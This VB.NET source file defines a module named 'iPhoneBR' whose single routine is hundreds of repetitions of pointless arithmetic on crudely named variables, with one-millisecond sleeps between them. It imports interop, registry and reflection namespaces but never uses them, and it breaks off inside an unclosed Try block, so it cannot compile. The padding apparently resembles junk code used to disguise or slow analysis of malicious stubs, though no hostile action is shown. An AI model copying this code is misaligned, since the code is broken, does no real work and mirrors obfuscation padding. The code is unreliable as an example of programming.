Imports System.Reflection
Imports System.Text
imports system.diagnostics
Imports System.IO
Imports System.Collections
Imports System
Imports System.Threading
Imports System.Runtime.InteropServices
imports system.windows.forms
Imports Microsoft.Win32
Imports Microsoft.VisualBasic
Imports System.Environment

Module iPhoneBR
Sub iCheck()
Try
            Dim crapper As Integer = 0
            Dim shits As Integer = 1
			Crapper += 1
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			    shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			    shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			    shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			    shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
				Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
            shits += shits + crapper - 5
			Crapper += 1
            shits = shits + 5 + 5 + 2
            System.Threading.Thread.Sleep(1)
